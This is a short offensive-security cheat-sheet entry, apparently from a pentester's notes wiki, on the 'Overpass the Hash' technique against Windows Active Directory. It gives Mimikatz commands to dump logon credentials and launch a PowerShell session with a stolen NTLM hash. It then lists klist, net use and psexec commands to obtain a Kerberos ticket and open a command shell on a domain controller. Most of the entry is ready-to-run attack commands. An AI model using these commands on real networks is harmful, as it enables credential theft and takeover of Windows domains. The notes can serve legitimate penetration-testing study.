# Overpass the Hash

*Over* abuse the NTLM user hash, [[Attacking-Kerberos]], to gain full Kerberos Ticket Granting Ticket or service ticket and avoiding the use of NTLM authentication. It requires access to the special administrative share named Admin$, thus also local administrative rights. [[Mimikatz-Cheatsheet]] can help:

PtH into a Kerberos Ticket
```powershell
privilege::debug
sekurlsa::logonpasswords # Or another NTLM obtaining method
sekurlsa::pth /user:$username /domain:$domain.$tld /ntlm:$NTofNTLM /run:powershell
# From this point powershell will pop as $username
```

To check Kerberos ticket cached and request some, we could also use any command the require domain permissions to get a TGS:
```powershell
klist # list cached Tickets
net use \\$dcname
klist # We should now have TGT
psexec.exe \\$dcname cmd.exe # Should have the official psexec application in the context of the TGT user on the DC
```

